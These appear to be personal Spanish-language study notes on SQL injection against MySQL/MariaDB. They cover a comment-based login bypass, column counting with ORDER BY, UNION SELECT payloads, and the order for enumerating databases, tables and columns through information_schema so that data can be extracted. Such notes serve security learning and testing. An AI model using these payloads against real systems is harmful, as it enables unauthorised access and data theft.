Con este comando

```
select ... from ... where username='admin'-- -' 
```

Se puede saltar el login bypass porque omitimos la contraseña al comentarla.

Para averiguar el numero de columnas de una tabla (cuando es error based -- sale error en la pagina)

```
select ... from ... where username = '...' order by X-- -;
```
(Nos tenemos que basar en columnas existentes).

Una vez que conocemos el numero de columnas, podemos jugar con el union select.

```
'union select .... , .... , ....
```

Demas comandos:

```
-database() --> ver BD que estamos usando

-union select schema_name from information_schema.schemata --> cuales BBDD existen. 

-group_concat(schema_name)

-limit 0,1 -->limitar informacion 

-user() -->ver usuario en uso

-select ... from ... information_schema.tables where table_schema = 'Nombre_tabla.schemata'-- - --> Ver las tablas de nombre_tabla.
```

# Anotaciones

-information_schema es la BBDD que viene por defecto en MariaDB y MySQL.
-schemata es una tabla, dentro de la cual está schema_name que es una columna que almacena los nombres de las bases de datos.
-tables es una tabla que almacena los nombres .
-Colums es una tabla que almacena el nombre de las columnas de las tablas. 

```
-information_schema --> es una BBDD
-schemata, tables, colums --> son tablas dentro de la BBDD. 
-Tables almacena el nombre de las tablas de todas las BBDD.
-schema_name --> columna dentro de tabla schemata. Aqui están los nombres de las diferentes bases de datos del sistema. 
-concat(x,y,z)
```

# Orden enumeracion 

* numero de columnas mediante `order by X-- -` 
* Buscamos todas las bases de datos dentro de information_schema en su tabla schemata.
	```
	union select schema_name from information_schema.schemata
	-- -
	```
* Buscamos todas las tablas de cierta BBDD que nos interese en information_schema, dentro de Tables, que contiene el NOMBRE de las tablas pero ADEMÁS poniendo como requisito que las tablas sean de BBDD de nuestro interés usando `WHERE`. 
	```
	union select table_name from information_schema.tables 
    where table_schema="BBDD"-- -

	con esto sacamos los nombres de las tablas de X BBDD
	```
* Una vez tenemos el nombre de las tablas, buscamos el nombre de las columnas que nos interesen dentro de la tabla COLUMNS de la BBDD information_schema, poniendo como requisito que las tablas sean de BBDD de nuestro interés usando `WHERE`. 
	```
	union select column_name from information_schema.columns where table_schema="BBDD" and table_name="NOMBRE TABLA"-- -

	Con esto sacamos las columnas de X BBDD
	```
* Una vez tenemos todos los datos, ya podemos buscar dentro de la BBDD que nos interese, refiriendonos concretamente en una tabla. 
```
union select [columna] from BBDD.tabla-- -
```


